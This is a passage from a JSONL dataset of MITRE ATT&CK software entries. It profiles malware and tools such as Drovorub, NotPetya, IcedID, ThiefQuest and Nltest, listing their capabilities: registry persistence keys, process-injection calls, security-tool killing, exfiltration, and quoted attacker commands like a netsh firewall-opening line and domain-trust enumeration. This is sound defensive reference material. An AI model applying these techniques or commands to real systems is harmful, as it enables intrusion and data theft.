malicious attachments.", "Ramsay can store collected documents in a custom container after encrypting and compressing them using RC4 and WinRAR.", "Ramsay can schedule tasks via the Windows COM API to maintain persistence.\t", "Ramsay can use the Windows COM API to schedule tasks and maintain persistence.", "Ramsay has included embedded Visual Basic scripts in malicious documents.\t", "Ramsay can extract its agent from the body of a malicious document.\t", "Ramsay can compress and archive collected files using WinRAR."], "is_subtechnique": false}
{"text": " [Cachedump](https://attack.mitre.org/software/S0119) is a publicly-available tool that program extracts cached password hashes from a system’s registry. (Citation: Mandiant APT1)", "idx": "https://attack.mitre.org/software/S0119", "title": "Cachedump", "entity": "Cachedump", "entity_type": "software", "entity_context": ["Cachedump can extract cached password hashes from cache entry information."], "is_subtechnique": false}
{"text": " [Drovorub](https://attack.mitre.org/software/S0502) is a Linux malware toolset comprised of an agent, client, server, and kernel modules, that has been used by [APT28](https://attack.mitre.org/groups/G0007).(Citation: NSA/FBI Drovorub August 2020)", "idx": "https://attack.mitre.org/software/S0502", "title": "Drovorub", "entity": "Drovorub", "entity_type": "software", "entity_context": ["Drovorub can use TCP to communicate between its agent and client modules.", "Drovorub can use a port forwarding rule on its agent module to relay network traffic through the client module to a remote host on the same network.", "Drovorub can transfer files from the victim machine.", "Drovorub can download files to a compromised host.", "Drovorub can use kernel modules to establish persistence.", "Drovorub can execute arbitrary commands as root on a compromised system.", "Drovorub has used a kernel module rootkit to hide processes, files, executables, and network artifacts from user space view.", "Drovorub can use the WebSocket protocol and has initiated communication with C2 servers with an HTTP Upgrade request.", "Drovorub has de-obsfuscated XOR encrypted payloads in WebSocket messages.", "Drovorub can delete specific files from a compromised host.", "Drovorub has used XOR encrypted payloads in WebSocket client to server messages.", "Drovorub can exfiltrate files over C2 infrastructure."], "is_subtechnique": false}
{"text": " [BLACKCOFFEE](https://attack.mitre.org/software/S0069) is malware that has been used by several Chinese groups since at least 2013. (Citation: FireEye APT17) (Citation: FireEye Periscope March 2018)", "idx": "https://attack.mitre.org/software/S0069", "title": "BLACKCOFFEE", "entity": "BLACKCOFFEE", "entity_type": "software", "entity_context": ["BLACKCOFFEE has also obfuscated its C2 traffic as normal traffic to sites such as Github.", "BLACKCOFFEE uses Microsoft’s TechNet Web portal to obtain a dead drop resolver containing an encoded tag with the IP address of a command and control server.", "BLACKCOFFEE has the capability to delete files.", "BLACKCOFFEE has the capability to discover processes.", "BLACKCOFFEE has the capability to create a reverse shell.", "BLACKCOFFEE uses Microsoft’s TechNet Web portal to obtain an encoded tag containing the IP address of a command and control server and then communicates separately with that IP address for C2. If the C2 server is discovered or shut down, the threat actors can update the encoded IP address on TechNet to maintain control of the victims’ machines.", "BLACKCOFFEE has the capability to enumerate files."], "is_subtechnique": false}
{"text": " [Nltest](https://attack.mitre.org/software/S0359) is a Windows command-line utility used to list domain controllers and enumerate domain trusts.(Citation: Nltest Manual)", "idx": "https://attack.mitre.org/software/S0359", "title": "Nltest", "entity": "Nltest", "entity_type": "software", "entity_context": ["Nltest may be used to enumerate the parent domain of a local machine using <code>/parentdomain</code>.", "Nltest may be used to enumerate trusted domains by using commands such as <code>nltest /domain_trusts</code>.", "Nltest may be used to enumerate remote domain controllers using options such as <code>/dclist</code> and <code>/dsgetdc</code>."], "is_subtechnique": false}
{"text": " [NETEAGLE](https://attack.mitre.org/software/S0034) is a backdoor developed by [APT30](https://attack.mitre.org/groups/G0013) with compile dates as early as 2008. It has two main variants known as “Scout” and “Norton.” (Citation: FireEye APT30)", "idx": "https://attack.mitre.org/software/S0034", "title": "NETEAGLE", "entity": "NETEAGLE", "entity_type": "software", "entity_context": ["NETEAGLE allows adversaries to enumerate and modify the infected host's file system. It supports searching for directories, creating directories, listing directory contents, reading and writing to files, retrieving file attributes, and retrieving volume information.", "NETEAGLE is capable of reading files over the C2 channel.", "Adversaries can also use NETEAGLE to establish an RDP connection with a controller over TCP/7519.", "NETEAGLE will attempt to detect if the infected host is configured to a proxy. If so, NETEAGLE will send beacons via an HTTP POST request; otherwise it will send beacons via UDP/6000.", "NETEAGLE will attempt to detect if the infected host is configured to a proxy. If so, NETEAGLE will send beacons via an HTTP POST request. NETEAGLE will also use HTTP to download resources that contain an IP address and Port Number pair to connect to for further C2.", "NETEAGLE allows adversaries to execute shell commands on the infected host.", "If NETEAGLE does not detect a proxy configured on the infected machine, it will send beacons via UDP/6000. Also, after retrieving a C2 IP address and Port Number, NETEAGLE will initiate a TCP connection to this socket. The ensuing connection is a plaintext C2 channel in which commands are specified by DWORDs.", "The \"SCOUT\" variant of NETEAGLE achieves persistence by adding itself to the <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</code> Registry key.", "NETEAGLE will decrypt resources it downloads with HTTP requests by using RC4 with the key \"ScoutEagle.\"", "NETEAGLE can send process listings over the C2 channel.", "NETEAGLE can use HTTP to download resources that contain an IP address and port number pair to connect to for C2."], "is_subtechnique": false}
{"text": " [netsh](https://attack.mitre.org/software/S0108) is a scripting utility used to interact with networking components on local or remote systems. (Citation: TechNet Netsh)", "idx": "https://attack.mitre.org/software/S0108", "title": "netsh", "entity": "netsh", "entity_type": "software", "entity_context": ["netsh can be used to discover system firewall settings.", "netsh can be used to set up a proxy tunnel to allow remote host access to an infected host.", "netsh can be used to disable local firewall settings.", "netsh can be used as a persistence proxy technique to execute a helper DLL when netsh.exe is executed."], "is_subtechnique": false}
{"text": " [Derusbi](https://attack.mitre.org/software/S0021) is malware used by multiple Chinese APT groups. (Citation: Novetta-Axiom) (Citation: ThreatConnect Anthem) Both Windows and Linux variants have been observed. (Citation: Fidelis Turbo)", "idx": "https://attack.mitre.org/software/S0021", "title": "Derusbi", "entity": "Derusbi", "entity_type": "software", "entity_context": ["Derusbi is capable of capturing video.", "Derusbi collects current and parent process IDs.", "Derusbi is capable of performing screen captures.", "Derusbi uses a backup communication method with an HTTP beacon.", "Derusbi injects itself into the secure shell (SSH) process.", "Derusbi beacons to destination port 443.", "Derusbi gathers the name of the local host, version of GNU Compiler Collection (GCC), and the system information about the CPU, machine, and operating system.", "Derusbi binds to a raw socket on a random source port between 31800 and 31900 for C2.", "A Linux version of Derusbi checks if the victim user ID is anything other than zero (normally used for root), and the malware will not execute if it does not have root privileges. Derusbi also gathers the username of the victim.", "Derusbi is capable of deleting files. It has been observed loading a Linux Kernel Module (LKM) and then deleting it from the hard disk as well as overwriting the data with null bytes.", "Derusbi is capable of performing audio captures.", "Derusbi variants have been seen that use Registry persistence to proxy execution through regsvr32.exe.", "Derusbi is capable of creating a remote Bash shell and executing commands.", "The Derusbi malware supports timestomping.", "Derusbi obfuscates C2 traffic with variable 4-byte XOR keys.", "Derusbi is capable of logging keystrokes.", "Derusbi is capable of obtaining directory, file, and drive listings.", "Derusbi has used unencrypted HTTP on port 443 for C2.", "Derusbi is capable of enumerating Registry keys and values."], "is_subtechnique": false}
{"text": " [RemoteCMD](https://attack.mitre.org/software/S0166) is a custom tool used by [APT3](https://attack.mitre.org/groups/G0022) to execute commands on a remote system similar to SysInternal's PSEXEC functionality. (Citation: Symantec Buckeye)", "idx": "https://attack.mitre.org/software/S0166", "title": "RemoteCMD", "entity": "RemoteCMD", "entity_type": "software", "entity_context": ["RemoteCMD can execute commands remotely by creating a new schedule task on the remote system", "RemoteCMD can execute commands remotely by creating a new service on the remote system.", "RemoteCMD copies a file over to the remote system before execution."], "is_subtechnique": false}
{"text": " [PLEAD](https://attack.mitre.org/software/S0435) is a remote access tool (RAT) and downloader used by [BlackTech](https://attack.mitre.org/groups/G0098) in targeted attacks in East Asia including Taiwan, Japan, and Hong Kong.(Citation: TrendMicro BlackTech June 2017)(Citation: JPCert PLEAD Downloader June 2018) [PLEAD](https://attack.mitre.org/software/S0435) has also been referred to as [TSCookie](https://attack.mitre.org/software/S0436), though more recent reporting indicates likely separation between the two.(Citation: JPCert TSCookie March 2018)(Citation: JPCert PLEAD Downloader June 2018)", "idx": "https://attack.mitre.org/software/S0435", "title": "PLEAD", "entity": "PLEAD", "entity_type": "software", "entity_context": ["PLEAD has the ability to list open windows on the compromised host.", "PLEAD samples were found to be highly obfuscated with junk code.", "PLEAD has the ability to steal saved credentials from web browsers.", "PLEAD has the ability to upload and download files to and from an infected host.", "PLEAD has been executed via malicious links in e-mails.", "PLEAD has the ability to list drives and files on the compromised host.", "PLEAD has the ability to delete files on the compromised host.", "PLEAD has the ability to steal saved passwords from Microsoft Outlook.", "PLEAD has the ability to list processes on the compromised host.", "PLEAD has the ability to execute shell commands on the compromised host.", "PLEAD has the ability to proxy network communications.", "PLEAD has used RC4 encryption to download modules.", "PLEAD has used HTTP for communications with command and control (C2) servers.", "PLEAD has been executed via malicious e-mail attachments."], "is_subtechnique": false}
{"text": " [ThiefQuest](https://attack.mitre.org/software/S0595) is a virus, data stealer, and wiper that presents itself as ransomware targeting macOS systems. [ThiefQuest](https://attack.mitre.org/software/S0595) was first seen in 2020 distributed via trojanized pirated versions of popular macOS software on Russian forums sharing torrent links.(Citation: Reed thiefquest fake ransom) Even though [ThiefQuest](https://attack.mitre.org/software/S0595) presents itself as ransomware, since the dynamically generated encryption key is never sent to the attacker it may be more appropriately thought of as a form of wiper malware.(Citation: wardle evilquest partii)(Citation: reed thiefquest ransomware analysis)", "idx": "https://attack.mitre.org/software/S0595", "title": "ThiefQuest", "entity": "ThiefQuest", "entity_type": "software", "entity_context": ["ThiefQuest uses the function <code>kill_unwanted</code> to obtain a list of running processes and kills each process matching a list of security related processes.", "ThiefQuest obtains a list of running processes using the function <code>kill_unwanted</code>.", "ThiefQuest searches through the <code>/Users/</code> folder looking for executable files. For each executable, ThiefQuest prepends a copy of itself to the beginning of the file. When the file is executed, the ThiefQuest code is executed first. ThiefQuest creates a hidden file, copies the original target executable to the file, then executes the new hidden file to maintain the appearance of normal behavior. ", "ThiefQuest uses various API to perform behaviors such as executing payloads and performing local enumeration.", "ThiefQuest can download and execute payloads in-memory or from disk.", "ThiefQuest invokes <code>time</code> call to check the system's time, executes a <code>sleep</code> command, invokes a second <code>time</code> call, and then compares the time difference between the two <code>time</code> calls and the amount of time the system slept to identify the sandbox.", "ThiefQuest prepends a copy of itself to the beginning of an executable file while maintaining the name of the executable.", "ThiefQuest uses the <code>kill_unwanted</code> function to get a list of running processes, compares each process with an encrypted list of “unwanted” security related programs, and kills the processes for security related programs.", "ThiefQuest uses the <code>CGEventTap</code> functions to perform keylogging.", "ThiefQuest uses a function named <code>is_debugging</code> to perform anti-debugging logic. The function invokes <code>sysctl</code> checking the returned value of <code>P_TRACED</code>. ThiefQuest also calls <code>ptrace</code> with the <code>PTRACE_DENY_ATTACH</code> flag to prevent debugging.  ", "ThiefQuest uploads files via unencrypted HTTP. ", "ThiefQuest uses various API functions such as <code>NSCreateObjectFileImageFromMemory</code> to load and link in-memory payloads.", "ThiefQuest hides a copy of itself in the user's <code>~/Library</code> directory by using a <code>.</code> at the beginning of the file name followed by 9 random characters.", "ThiefQuest uses AppleScript's <code>osascript -e</code> command to launch ThiefQuest's persistence via Launch Agent and Launch Daemon. ", "ThiefQuest installs a launch item using an embedded encrypted launch agent property list template. The plist file is installed in the <code>~/Library/LaunchAgents/</code> folder and configured with the path to the persistent binary located in the <code>~/Library/</code> folder.", "ThiefQuest encrypts a set of file extensions on a host, deletes the original files, and provides a ransom note with no contact information.", "When running with root privileges after a Launch Agent is installed, ThiefQuest installs a plist file to the <code>/Library/LaunchDaemons/</code> folder with the <code>RunAtLoad</code> key set to <code>true</code> establishing persistence as a Launch Daemon. ", "ThiefQuest exfiltrates targeted file extensions in the <code>/Users/</code> folder to the command and control server via unencrypted HTTP. Network packets contain a string with two pieces of information: a file path and the contents of the file in a base64 encoded string."], "is_subtechnique": false}
{"text": " [IcedID](https://attack.mitre.org/software/S0483) is a modular banking malware designed to steal financial information that has been observed in the wild since at least 2017. [IcedID](https://attack.mitre.org/software/S0483) has been downloaded by [Emotet](https://attack.mitre.org/software/S0367) in multiple campaigns.(Citation: IBM IcedID November 2017)(Citation: Juniper IcedID June 2020)", "idx": "https://attack.mitre.org/software/S0483", "title": "IcedID", "entity": "IcedID", "entity_type": "software", "entity_context": ["IcedID has the ability to identify Workgroup membership.", "IcedID has been delivered via phishing e-mails with malicious attachments.", "IcedID has used SSL and TLS in communications with C2.", "IcedID can inject itself into a suspended msiexec.exe process to send beacons to C2 while appearing as a normal msi application. ", "IcedID has utilzed encrypted binaries and base64 encoded strings.", "IcedID has used <code>ZwQueueApcThread</code> to inject itself into remote processes.", "IcedID has the ability to identify the computer name and OS version on a compromised host.", "IcedID has used WMI to execute binaries.", "IcedID has used HTTPS in communications with C2.", "IcedID has established persistence by creating a Registry run key.", "IcedID can query LDAP to identify additional users on the network to infect.", "IcedID has created a scheduled task that executes every hour to establish persistence.", "IcedID has embedded binaries within RC4 encrypted .png files.", "IcedID has the ability to download additional modules and a configuration file from C2.", "IcedID has used web injection attacks to redirect victims to spoofed sites designed to harvest banking and other credentials.  IcedID can use a self signed TLS certificate in connection with the spoofed site and simultaneously maintains a live connection with the legitimate site to display the correct URL and certificates in the browser.", "IcedID has used obfuscated VBA string expressions.", "IcedID has called <code>ZwWriteVirtualMemory</code>, <code>ZwProtectVirtualMemory</code>, <code>ZwQueueApcThread</code>, and <code>NtResumeThread</code> to inject itself into a remote process.", "IcedID has been executed through Word documents with malicious embedded macros.", "IcedID has packed and encrypted its loader module."], "is_subtechnique": false}
{"text": " [ipconfig](https://attack.mitre.org/software/S0100) is a Windows utility that can be used to find information about a system's TCP/IP, DNS, DHCP, and adapter configuration. (Citation: TechNet Ipconfig)", "idx": "https://attack.mitre.org/software/S0100", "title": "ipconfig", "entity": "ipconfig", "entity_type": "software", "entity_context": ["ipconfig can be used to display adapter configuration on Windows systems, including information for TCP/IP, DNS, and DHCP."], "is_subtechnique": false}
{"text": " [VaporRage](https://attack.mitre.org/software/S0636) is a shellcode downloader that has been used by [APT29](https://attack.mitre.org/groups/G0016) since at least 2021.(Citation: MSTIC Nobelium Toolset May 2021)", "idx": "https://attack.mitre.org/software/S0636", "title": "VaporRage", "entity": "VaporRage", "entity_type": "software", "entity_context": ["VaporRage can deobfuscate XOR-encoded shellcode prior to execution.", "VaporRage has the ability to check for the presence of a specific DLL and terminate if it is not found.", "VaporRage has the ability to download malicious shellcode to compromised systems.", "VaporRage can use HTTP to download shellcode from compromised websites."], "is_subtechnique": false}
{"text": " [KEYMARBLE](https://attack.mitre.org/software/S0271) is a Trojan that has reportedly been used by the North Korean government. (Citation: US-CERT KEYMARBLE Aug 2018)", "idx": "https://attack.mitre.org/software/S0271", "title": "KEYMARBLE", "entity": "KEYMARBLE", "entity_type": "software", "entity_context": ["KEYMARBLE can capture screenshots of the victim’s machine.", "KEYMARBLE can execute shell commands using cmd.exe.", "KEYMARBLE has a command to search for files on the victim’s machine.", "KEYMARBLE gathers the MAC address of the victim’s machine.", "KEYMARBLE can obtain a list of running processes on the system.", "KEYMARBLE uses a customized XOR algorithm to encrypt C2 communications.", "KEYMARBLE has a command to create Registry entries for storing data under <code>HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\WABE\\DataPath</code>.", "KEYMARBLE uses port 443 for C2.", "KEYMARBLE has the capability to delete files off the victim’s machine.", "KEYMARBLE can upload files to the victim’s machine and can download additional payloads.", "KEYMARBLE has the capability to collect the computer name, language settings, the OS version, CPU information, disk devices, and time elapsed since system start."], "is_subtechnique": false}
{"text": " [HARDRAIN](https://attack.mitre.org/software/S0246) is a Trojan malware variant reportedly used by the North Korean government. (Citation: US-CERT HARDRAIN March 2018)", "idx": "https://attack.mitre.org/software/S0246", "title": "HARDRAIN", "entity": "HARDRAIN", "entity_type": "software", "entity_context": ["HARDRAIN uses the command <code>cmd.exe /c netsh firewall add portopening TCP 443 \"adp\"</code> and makes the victim machine function as a proxy server.", "HARDRAIN opens the Windows Firewall to modify incoming connections.", "HARDRAIN uses cmd.exe to execute <code>netsh</code>commands.", "HARDRAIN binds and listens on port 443 with a FakeTLS method.", "HARDRAIN binds and listens on port 443.", "HARDRAIN uses FakeTLS to communicate with its C2 server."], "is_subtechnique": false}
{"text": " [Caterpillar WebShell](https://attack.mitre.org/software/S0572) is a self-developed Web Shell tool created by the group [Volatile Cedar](https://attack.mitre.org/groups/G0123).(Citation: ClearSky Lebanese Cedar Jan 2021)", "idx": "https://attack.mitre.org/software/S0572", "title": "Caterpillar WebShell", "entity": "Caterpillar WebShell", "entity_type": "software", "entity_context": ["Caterpillar WebShell can run commands on the compromised asset with CMD functions.", "Caterpillar WebShell can obtain a list of user accounts from a victim's machine.", "Caterpillar WebShell can search for files in directories. ", "Caterpillar WebShell can obtain a list of the services from a system. ", "Caterpillar WebShell can upload files over the C2 channel. ", "Caterpillar WebShell can gather the IP address from the victim's machine using the IP config command. ", "Caterpillar WebShell has a module to perform brute force attacks on a system. ", "Caterpillar WebShell has a module to use a rootkit on a system. ", "Caterpillar WebShell has a module to use a port scanner on a system. ", "Caterpillar WebShell has a module to gather information from the compromrised asset, including the computer version, computer name, IIS version, and more. ", "Caterpillar WebShell has a module to download and upload files to the system. ", "Caterpillar WebShell can gather a list of processes running on the machine. ", "Caterpillar WebShell has a command to modify a Registry key.", "Caterpillar WebShell can obtain a list of local groups of users from a system.", "Caterpillar WebShell has a module to collect information from the local database. "], "is_subtechnique": false}
{"text": " [XTunnel](https://attack.mitre.org/software/S0117) a VPN-like network proxy tool that can relay traffic between a C2 server and a victim. It was first seen in May 2013 and reportedly used by [APT28](https://attack.mitre.org/groups/G0007) during the compromise of the Democratic National Committee. (Citation: Crowdstrike DNC June 2016) (Citation: Invincea XTunnel) (Citation: ESET Sednit Part 2)", "idx": "https://attack.mitre.org/software/S0117", "title": "XTunnel", "entity": "XTunnel", "entity_type": "software", "entity_context": ["XTunnel is capable of probing the network for open ports.", "XTunnel relays traffic between a C2 server and a victim.", "A version of XTunnel introduced in July 2015 obfuscated the binary using opaque predicates and other techniques in a likely attempt to obfuscate it and bypass security products.", "XTunnel has been used to execute remote commands.", "The C2 server used by XTunnel provides a port number to the victim to use as a fallback in case the connection closes on the currently used port.", "XTunnel uses SSL/TLS and RC4 to encrypt traffic.", "XTunnel is capable of accessing locally stored passwords on victims.", "A version of XTunnel introduced in July 2015 inserted junk code into the binary in a likely attempt to obfuscate it and bypass security products."], "is_subtechnique": false}
{"text": " [Seasalt](https://attack.mitre.org/software/S0345) is malware that has been linked to [APT1](https://attack.mitre.org/groups/G0006)'s 2010 operations. It shares some code similarities with [OceanSalt](https://attack.mitre.org/software/S0346).(Citation: Mandiant APT1 Appendix)(Citation: McAfee Oceansalt Oct 2018)", "idx": "https://attack.mitre.org/software/S0345", "title": "Seasalt", "entity": "Seasalt", "entity_type": "software", "entity_context": ["Seasalt obfuscates configuration data.", "Seasalt uses HTTP for C2 communications.", "Seasalt is capable of installing itself as a service.", "Seasalt has a command to download additional files.", "Seasalt has masqueraded as a service called \"SaSaut\" with a display name of \"System Authorization Service\" in an apparent attempt to masquerade as a legitimate service.", "Seasalt uses cmd.exe to create a reverse shell on the infected endpoint.", "Seasalt has the capability to identify the drive type on a victim.", "Seasalt creates a Registry entry to ensure infection after reboot under <code>HKLM\\Software\\Microsoft\\Windows\\currentVersion\\Run</code>.", "Seasalt has a command to perform a process listing.", "Seasalt has a command to delete a specified file."], "is_subtechnique": false}
{"text": " [WINERACK](https://attack.mitre.org/software/S0219) is a backdoor used by [APT37](https://attack.mitre.org/groups/G0067). (Citation: FireEye APT37 Feb 2018)", "idx": "https://attack.mitre.org/software/S0219", "title": "WINERACK", "entity": "WINERACK", "entity_type": "software", "entity_context": ["WINERACK can gather information on the victim username.", "WINERACK can enumerate services.", "WINERACK can enumerate processes.", "WINERACK can enumerate active windows.", "WINERACK can create a reverse shell that utilizes statically-linked Wine cmd.exe code to emulate Windows command prompt commands.", "WINERACK can enumerate files and directories.", "WINERACK can gather information about the host."], "is_subtechnique": false}
{"text": " [Wingbird](https://attack.mitre.org/software/S0176) is a backdoor that appears to be a version of commercial software [FinFisher](https://attack.mitre.org/software/S0182). It is reportedly used to attack individual computers instead of networks. It was used by [NEODYMIUM](https://attack.mitre.org/groups/G0055) in a May 2016 campaign. (Citation: Microsoft SIR Vol 21) (Citation: Microsoft NEODYMIUM Dec 2016)", "idx": "https://attack.mitre.org/software/S0176", "title": "Wingbird", "entity": "Wingbird", "entity_type": "software", "entity_context": ["Wingbird side loads a malicious file, sspisrv.dll, in part of a spoofed lssas.exe service.", "Wingbird performs multiple process injections to hijack system processes and execute malicious code.", "Wingbird checks the victim OS version after executing to determine where to drop files based on whether the victim is 32-bit or 64-bit.", "Wingbird checks for the presence of Bitdefender security software.", "Wingbird deletes its payload along with the payload's parent process after it finishes copying files.", "Wingbird exploits CVE-2016-4117 to allow an executable to gain escalated privileges.", "Wingbird uses services.exe to register a new autostart service named \"Audit Service\" using a copy of the local lsass.exe file.", "Wingbird drops a malicious file (sspisrv.dll) alongside a copy of lsass.exe, which is used to register a service that loads sspisrv.dll as a driver. The payload of the malicious driver (located in its entry-point function) is executed when loaded by lsass.exe before the spoofed service becomes unstable and crashes."], "is_subtechnique": false}
{"text": " [Gazer](https://attack.mitre.org/software/S0168) is a backdoor used by [Turla](https://attack.mitre.org/groups/G0010) since at least 2016. (Citation: ESET Gazer Aug 2017)", "idx": "https://attack.mitre.org/software/S0168", "title": "Gazer", "entity": "Gazer", "entity_type": "software", "entity_context": ["Gazer logs its actions into files that are encrypted with 3DES. It also uses RSA to encrypt resources.", "Gazer stores configuration items in alternate data streams (ADSs) if the Registry is not accessible.", "For early Gazer versions, the compilation timestamp was faked.", "Gazer obtains the current user's security identifier.", "Gazer has commands to delete files and persistence mechanisms from the victim.", "Gazer can establish persistence by creating a .lnk file in the Start menu or by modifying existing .lnk files to execute the malware through cmd.exe.", "Gazer can establish persistence by setting the value “Shell” with “explorer.exe, %malware_pathfile%” under the Registry key <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon</code>.", "Gazer performs thread execution hijacking to inject its orchestrator into a running thread from a remote process.", "Gazer can establish persistence by creating a .lnk file in the Start menu.", "Gazer uses custom encryption for C2 that uses RSA.", "Gazer uses custom encryption for C2 that uses 3DES.", "Gazer can establish persistence through the system screensaver by configuring it to execute the malware.", "Gazer injects its communication module into an Internet accessible process through which it performs C2.", "Gazer versions are signed with various valid certificates; one was likely faked and issued by Comodo for \"Solid Loop Ltd,\" and another was issued for \"Ultimate Computer Support Ltd.\"", "Gazer can establish persistence by creating a scheduled task.", "Gazer communicates with its C2 servers over HTTP.", "Gazer can execute a task to download a file."], "is_subtechnique": false}
{"text": " [Mosquito](https://attack.mitre.org/software/S0256) is a Win32 backdoor that has been used by [Turla](https://attack.mitre.org/groups/G0010). [Mosquito](https://attack.mitre.org/software/S0256) is made up of three parts: the installer, the launcher, and the backdoor. The main backdoor is called CommanderDLL and is launched by the loader program. (Citation: ESET Turla Mosquito Jan 2018)", "idx": "https://attack.mitre.org/software/S0256", "title": "Mosquito", "entity": "Mosquito", "entity_type": "software", "entity_context": ["Mosquito runs <code>whoami</code> on the victim’s machine.", "Mosquito uses the <code>ipconfig</code> command.", "Mosquito can launch PowerShell Scripts.", "Mosquito leverages the CreateProcess() and LoadLibrary() calls to execute files with the .dll and .exe extensions.", "Mosquito's launcher uses rundll32.exe in a Registry Key value to start the main backdoor capability.", "Mosquito stores configuration values under the Registry key <code>HKCU\\Software\\Microsoft\\dllname</code> and modifies Registry keys under <code>HKCR\\CLSID\\...\\InprocServer32</code>with a path to the launcher.", "Mosquito runs <code>tasklist</code> to obtain running processes.", "Mosquito’s installer is obfuscated with a custom crypter to obfuscate the installer.", "Mosquito uses a custom encryption algorithm, which consists of XOR and a stream that is similar to the Blum Blum Shub algorithm.", "Mosquito deletes files using DeleteFileW API call.", "Mosquito executes cmd.exe and uses a pipe to read the results and send back the output to the C2 server.", "Mosquito's installer searches the Registry and system to see if specific antivirus tools are installed on the system.", "Mosquito's installer uses WMI to search for antivirus display names.", "Mosquito establishes persistence under the Registry key <code>HKCU\\Software\\Run auto_update</code>.", "Mosquito uses COM hijacking as a method of persistence.", "Mosquito can upload and download files to the victim."], "is_subtechnique": false}
{"text": " [CallMe](https://attack.mitre.org/software/S0077) is a Trojan designed to run on Apple OSX. It is based on a publicly available tool called Tiny SHell. (Citation: Scarlet Mimic Jan 2016)", "idx": "https://attack.mitre.org/software/S0077", "title": "CallMe", "entity": "CallMe", "entity_type": "software", "entity_context": ["CallMe has the capability to download a file to the victim from the C2 server.", "CallMe exfiltrates data to its C2 server over the same protocol as C2 communications.", "CallMe has the capability to create a reverse shell on victims.", "CallMe uses AES to encrypt C2 traffic."], "is_subtechnique": false}
{"text": " [GRIFFON](https://attack.mitre.org/software/S0417) is a JavaScript backdoor used by [FIN7](https://attack.mitre.org/groups/G0046). (Citation: SecureList Griffon May 2019)", "idx": "https://attack.mitre.org/software/S0417", "title": "GRIFFON", "entity": "GRIFFON", "entity_type": "software", "entity_context": ["GRIFFON is written in and executed as JavaScript.\t", "GRIFFON has used a reconnaissance module that can be used to retrieve information about a victim's computer, including the resolution of the workstation .", "GRIFFON has used a persistence module that stores the implant inside the Registry, which executes at logon.", "GRIFFON has used a screenshot module that can be used to take a screenshot of the remote system.", "GRIFFON has used a reconnaissance module that can be used to retrieve the date and time of the system.\t", "GRIFFON has used a reconnaissance module that can be used to retrieve Windows domain membership information.", "GRIFFON has used <code>sctasks</code> for persistence. ", "GRIFFON has used PowerShell to execute the Meterpreter downloader TinyMet."], "is_subtechnique": false}
{"text": " [NotPetya](https://attack.mitre.org/software/S0368) is malware that was used by [Sandworm Team](https://attack.mitre.org/groups/G0034) in a worldwide attack starting on June 27, 2017. While [NotPetya](https://attack.mitre.org/software/S0368) appears as a form of ransomware, its main purpose was to destroy data and disk structures on compromised systems; the attackers never intended to make the encrypted data recoverable. As such, [NotPetya](https://attack.mitre.org/software/S0368) may be more appropriately thought of as a form of wiper malware. [NotPetya](https://attack.mitre.org/software/S0368) contains worm-like features to spread itself across a computer network using the SMBv1 exploits EternalBlue and EternalRomance.(Citation: Talos Nyetya June 2017)(Citation: US-CERT NotPetya 2017)(Citation: ESET Telebots June 2017)(Citation: US District Court Indictment GRU Unit 74455 October 2020)", "idx": "https://attack.mitre.org/software/S0368", "title": "NotPetya", "entity": "NotPetya", "entity_type": "software", "entity_context": ["NotPetya can use <code>wmic</code> to help propagate itself across a network.", "NotPetya uses <code>wevtutil</code> to clear the Windows event logs.", "NotPetya determines if specific antivirus programs are running on an infected host machine.", "NotPetya can use two exploits in SMBv1, EternalBlue and EternalRomance, to spread itself to other remote systems on the network.", "NotPetya drops PsExec with the filename dllhost.dat.", "NotPetya creates a task to reboot the system one hour after infection.", "NotPetya encrypts user files and disk structures like the MBR with 2048-bit RSA.", "NotPetya uses <code>rundll32.exe</code> to install itself on remote systems when accessed via PsExec or <code>wmic</code>.", "NotPetya can use PsExec, which interacts with the <code>ADMIN$</code> network share to execute commands on remote systems.", "NotPetya can use PsExec to help propagate itself across a network.", "NotPetya can use valid credentials with PsExec or <code>wmic</code> to spread itself to remote systems.", "NotPetya contains a modified version of Mimikatz to help gather credentials that are later used for lateral movement.", "NotPetya will reboot the system one hour after infection.", "NotPetya searches for files ending with dozens of different file extensions prior to encryption."], "is_subtechnique": false}
{"text": " [Backdoor.Oldrea](https://attack.mitre.org/software/S0093) is a backdoor used by [Dragonfly](https://attack.mitre.org/groups/G0035). It appears to be custom malware authored by the group or specifically for it. (Citation: Symantec Dragonfly)", "idx": "https://attack.mitre.org/software/S0093", "title": "Backdoor.Oldrea", "entity": "Backdoor.Oldrea", "entity_type": "software", "entity_context": ["Backdoor.Oldrea collects the current username from the victim.", "Backdoor.Oldrea collects address book information from Outlook.", "Some Backdoor.Oldrea samples use standard Base64 + bzip2, and some use standard Base64 + reverse XOR + RSA-2048 to decrypt data received from C2 servers.", "Backdoor.Oldrea collects information about available drives, default browser, desktop file list, My Documents, Internet history, program files, and root of available drives. It also searches for ICS-related software files.", "Backdoor.Oldrea contains a cleanup module that removes traces of itself from the victim.", "Backdoor.Oldrea adds Registry Run keys to achieve persistence.", "Backdoor.Oldrea writes collected data to a temporary file in an encrypted form before exfiltration to a C2 server.", "Backdoor.Oldrea injects itself into explorer.exe.", "Some Backdoor.Oldrea samples contain a publicly available Web browser password recovery tool.", "Backdoor.Oldrea collects information about the Internet adapter configuration.", "Backdoor.Oldrea collects information about running processes.", "Backdoor.Oldrea collects information about the OS and computer name."], "is_subtechnique": false}
{"text": " [dsquery](https://attack.mitre.org/software/S0105) is a command-line utility that can be used to query Active Directory for information from a system within a domain. (Citation: TechNet Dsquery) It is typically installed only on Windows Server versions but can be installed on non-server variants through the Microsoft-provided Remote Server Administration Tools bundle.", "idx": "https://attack.mitre.org/software/S0105", "title": "dsquery", "entity": "dsquery", "entity_type": "software", "entity_context": ["dsquery can be used to gather information on user accounts within a domain.", "dsquery can be used to gather information on domain trusts with <code>dsquery * -filter \"(objectClass=trustedDomain)\" -attr *</code>.", "dsquery can be used to gather information on permission groups within a domain."], "is_subtechnique": false}
